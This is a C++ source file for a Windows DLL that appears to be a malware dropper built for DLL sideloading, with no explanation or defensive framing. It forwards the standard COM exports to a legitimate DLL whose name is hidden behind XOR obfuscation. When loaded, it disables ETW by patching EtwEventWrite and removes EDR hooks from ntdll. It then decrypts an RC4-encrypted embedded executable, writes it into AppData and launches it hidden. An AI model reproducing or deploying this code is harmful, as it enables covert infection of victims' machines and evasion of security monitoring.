#include <windows.h>
#include <shlobj.h>
#include <string>
#include <vector>
#include <cstring>
#pragma comment(lib, "shell32.lib")
#include "OBF_STRINGS.h"

static HMODULE g_hSelf = nullptr;

static const unsigned char RC4_KEY[] = { 0x47,0xB6,0x9A,0x5A,0x6F,0x71,0xCA,0x2C,0x03,0x9E,0x40,0xBB,0x10,0x17,0x97,0x2B };
static const size_t RC4_KEY_LEN = sizeof(RC4_KEY);

static std::wstring dec(const unsigned char* e, size_t n) {
    std::wstring o; o.reserve(n / 2);
    for (size_t i = 0; i + 1 < n; i += 2) {
        unsigned char lo = e[i] ^ STR_KEY[(i / 2) % STR_KEY_LEN];
        unsigned char hi = e[i + 1];
        o += (wchar_t)(lo | (hi << 8));
    }
    return o;
}

static void RC4(BYTE* data, DWORD len, const BYTE* key, DWORD klen) {
    BYTE s[256];
    for (int i = 0; i < 256; i++) s[i] = (BYTE)i;
    BYTE j = 0;
    for (int i = 0; i < 256; i++) {
        j = (BYTE)(j + s[i] + key[i % klen]);
        BYTE t = s[i]; s[i] = s[j]; s[j] = t;
    }
    BYTE a = 0; j = 0;
    for (DWORD n = 0; n < len; n++) {
        a = (BYTE)(a + 1);
        j = (BYTE)(j + s[a]);
        BYTE t = s[a]; s[a] = s[j]; s[j] = t;
        data[n] ^= s[(BYTE)(s[a] + s[j])];
    }
}

static void PatchETW() {
    HMODULE h = GetModuleHandleW(L"ntdll.dll");
    if (!h) return;
    FARPROC p = GetProcAddress(h, "EtwEventWrite");
    if (!p) return;
    DWORD old;
    if (VirtualProtect(p, 1, PAGE_EXECUTE_READWRITE, &old)) {
        *(BYTE*)p = 0xC3;
        VirtualProtect(p, 1, old, &old);
    }
}

static void UnhookNtdll() {
    HANDLE hFile = CreateFileW(L"C:\\Windows\\System32\\ntdll.dll",
        GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;
    HANDLE hMap = CreateFileMappingW(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    if (!hMap) { CloseHandle(hFile); return; }
    LPVOID pMap = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
    if (!pMap) { CloseHandle(hMap); CloseHandle(hFile); return; }
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (hNtdll) {
        PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pMap;
        if (pDos->e_magic == IMAGE_DOS_SIGNATURE) {
            PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE*)pMap + pDos->e_lfanew);
            PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
            for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
                if (memcmp(pSec[i].Name, ".text", 5) == 0) {
                    DWORD old;
                    if (VirtualProtect((BYTE*)hNtdll + pSec[i].VirtualAddress,
                        pSec[i].Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &old)) {
                        memcpy((BYTE*)hNtdll + pSec[i].VirtualAddress,
                            (BYTE*)pMap + pSec[i].PointerToRawData,
                            pSec[i].Misc.VirtualSize);
                        VirtualProtect((BYTE*)hNtdll + pSec[i].VirtualAddress,
                            pSec[i].Misc.VirtualSize, old, &old);
                    }
                }
            }
        }
    }
    UnmapViewOfFile(pMap);
    CloseHandle(hMap);
    CloseHandle(hFile);
}

static bool extract_payload(const std::wstring& out_path) {
    HRSRC r = FindResourceW(g_hSelf, MAKEINTRESOURCEW(1), MAKEINTRESOURCEW(10));
    if (!r) return false;
    DWORD sz = SizeofResource(g_hSelf, r);
    if (!sz) return false;
    HGLOBAL h = LoadResource(g_hSelf, r);
    if (!h) return false;
    BYTE* data = (BYTE*)LockResource(h);
    if (!data) return false;
    std::vector<BYTE> plain(sz);
    memcpy(plain.data(), data, sz);
    RC4(plain.data(), sz, RC4_KEY, (DWORD)RC4_KEY_LEN);
    if (plain.size() < 2 || plain[0] != 0x4D || plain[1] != 0x5A) return false;
    HANDLE f = CreateFileW(out_path.c_str(), GENERIC_WRITE, 0, NULL,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (f == INVALID_HANDLE_VALUE) return false;
    DWORD w = 0;
    BOOL ok = WriteFile(f, plain.data(), (DWORD)plain.size(), &w, NULL);
    CloseHandle(f);
    return ok && w == plain.size();
}

STDAPI DllCanUnloadNow(void) {
    typedef HRESULT (WINAPI* fn_t)(void);
    std::wstring n = dec(S_REAL, sizeof(S_REAL));
    HMODULE h = LoadLibraryW(n.c_str());
    if (!h) return S_FALSE;
    fn_t fn = (fn_t)GetProcAddress(h, "DllCanUnloadNow");
    return fn ? fn() : S_FALSE;
}

STDAPI DllGetClassObject(REFCLSID rclsid, REFIID riid, LPVOID* ppv) {
    typedef HRESULT (WINAPI* fn_t)(REFCLSID, REFIID, LPVOID*);
    std::wstring n = dec(S_REAL, sizeof(S_REAL));
    HMODULE h = LoadLibraryW(n.c_str());
    if (!h) return E_FAIL;
    fn_t fn = (fn_t)GetProcAddress(h, "DllGetClassObject");
    return fn ? fn(rclsid, riid, ppv) : E_FAIL;
}

STDAPI DllRegisterServer(void) {
    typedef HRESULT (WINAPI* fn_t)(void);
    std::wstring n = dec(S_REAL, sizeof(S_REAL));
    HMODULE h = LoadLibraryW(n.c_str());
    if (!h) return E_FAIL;
    fn_t fn = (fn_t)GetProcAddress(h, "DllRegisterServer");
    return fn ? fn() : E_FAIL;
}

STDAPI DllUnregisterServer(void) {
    typedef HRESULT (WINAPI* fn_t)(void);
    std::wstring n = dec(S_REAL, sizeof(S_REAL));
    HMODULE h = LoadLibraryW(n.c_str());
    if (!h) return E_FAIL;
    fn_t fn = (fn_t)GetProcAddress(h, "DllUnregisterServer");
    return fn ? fn() : E_FAIL;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID) {
    if (reason != DLL_PROCESS_ATTACH) return TRUE;

    g_hSelf = hModule;
    DisableThreadLibraryCalls(hModule);

    HMODULE hPin = nullptr;
    GetModuleHandleExW(
        GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_PIN,
        (LPCWSTR)&DllMain, &hPin);

    PatchETW();
    UnhookNtdll();

    wchar_t ad[MAX_PATH] = { 0 };
    if (FAILED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, ad))) return TRUE;

    std::wstring base    = std::wstring(ad) + dec(S_PATH, sizeof(S_PATH));
    std::wstring exePath = base + L"\\" + dec(S_NAME, sizeof(S_NAME));
    std::wstring args    = dec(S_ARGS, sizeof(S_ARGS));

    CreateDirectoryW(base.c_str(), NULL);

    if (!extract_payload(exePath)) return TRUE;

    std::wstring workdir = exePath.substr(0, exePath.find_last_of(L'\\'));
    std::wstring cmdline = L"\"" + exePath + L"\" " + args;

    STARTUPINFOW si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi = { 0 };
    std::vector<wchar_t> cl(cmdline.begin(), cmdline.end());
    cl.push_back(L'\0');

    DWORD flags = CREATE_NEW_CONSOLE | CREATE_BREAKAWAY_FROM_JOB;
    BOOL ok = CreateProcessW(nullptr, cl.data(), nullptr, nullptr, FALSE,
        flags, nullptr, workdir.c_str(), &si, &pi);

    if (!ok && GetLastError() == ERROR_ACCESS_DENIED) {
        flags &= ~CREATE_BREAKAWAY_FROM_JOB;
        ok = CreateProcessW(nullptr, cl.data(), nullptr, nullptr, FALSE,
            flags, nullptr, workdir.c_str(), &si, &pi);
    }

    if (ok) {
        WaitForSingleObject(pi.hProcess, 10000);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }

    return TRUE;
}